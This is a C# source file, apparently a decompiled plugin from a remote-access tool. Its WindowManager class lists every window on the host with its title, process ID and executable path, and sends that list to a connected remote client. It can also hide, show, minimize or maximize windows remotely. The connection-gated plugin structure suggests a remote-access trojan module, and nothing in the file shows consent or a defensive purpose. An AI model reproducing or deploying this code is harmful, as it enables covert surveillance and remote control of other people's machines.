using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal static class WindowManager
{
	public const int SW_RESTORE = 9;

	public const int SW_MINIMIZE = 2;

	public const int SW_MAXIMIZE = 3;

	public const int SW_HIDE = 0;

	public const uint WM_CLOSE = 16u;

	public static string GetProcessPath(int processId)
	{
		try
		{
			return Process.GetProcessById(processId).MainModule.FileName;
		}
		catch
		{
		}
		return string.Empty;
	}

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowModuleFileName(IntPtr hWnd, StringBuilder lpszFileName, uint cchFileNameMax);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

	private static string GetWindowText(IntPtr hWnd)
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		if (GetWindowText(hWnd, stringBuilder, 1024) > 0)
		{
			return stringBuilder.ToString();
		}
		return string.Empty;
	}

	public static void Start()
	{
		try
		{
			List<object> list = new List<object> { "Window", "List" };
			_ = IntPtr.Zero;
			IntPtr intPtr = IntPtr.Zero;
			do
			{
				if (!Client.itsConnect)
				{
					return;
				}
				intPtr = FindWindowEx(IntPtr.Zero, intPtr, null, null);
				if (intPtr != IntPtr.Zero)
				{
					string windowText = GetWindowText(intPtr);
					if (!string.IsNullOrEmpty(windowText))
					{
						bool flag = IsWindowVisible(intPtr);
						int processId = 0;
						GetWindowThreadProcessId(intPtr, out processId);
						string processPath = GetProcessPath(processId);
						list.AddRange(new object[5]
						{
							windowText,
							flag,
							(int)intPtr,
							processId,
							processPath
						});
					}
				}
			}
			while (intPtr != IntPtr.Zero);
			Client.Send(LEB128.Write(list.ToArray()));
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Window", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll")]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	public static void ShowWindow(IntPtr hWnd)
	{
		ShowWindow(hWnd, 9);
	}

	public static void HideWindow(IntPtr hWnd)
	{
		ShowWindow(hWnd, 0);
	}

	public static void MinimizeWindow(IntPtr hWnd)
	{
		ShowWindow(hWnd, 2);
	}

	public static void MaximizeWindow(IntPtr hWnd)
	{
		ShowWindow(hWnd, 3);
	}
}
